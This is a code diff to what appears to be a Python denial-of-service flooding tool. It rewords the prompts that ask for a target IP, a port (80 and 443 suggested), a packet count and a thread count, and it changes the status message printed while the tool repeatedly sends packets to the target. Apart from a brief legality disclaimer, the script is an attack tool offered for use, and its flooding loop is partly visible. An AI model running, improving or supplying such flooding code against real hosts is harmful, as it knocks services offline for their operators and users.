@@ -28,10 +28,10 @@ print("Disclaimer: Illecit use of this tool could lead to a violation of federal
 print("Use this tool only on your own website or websites from which you have obtained permission.")
 print("License: The source code of this tool is under the MIT License. © 2022 Tommaso Bona")
 print()
-ip = str(input("[Q] target 1's IP:"))
-port = int(input("[Q] Port(must be an number): "))
-pack = int(input("[Q] packet/s(must be an number): "))
-thread = int(input("[Q] Thread(must be an number): "))
+ip = str(input("Target's IP:"))
+port = int(input("Port number (80 and 443 suggested): "))
+pack = int(input("Number of packets: "))
+thread = int(input("Number of threads: "))
 time.sleep(2)
 os.system("clear")
 print("\033[91m")
@@ -59,7 +59,7 @@ def start():
             for i in range(pack):
                 s.send(hh)
             xx += 1
-            print("yep we attackin "+ip+" | sent: "+str(xx))
+            print("Attacking "+ip+" | sent: "+str(xx))
         except:
             s.close()
             print("Packet sent")
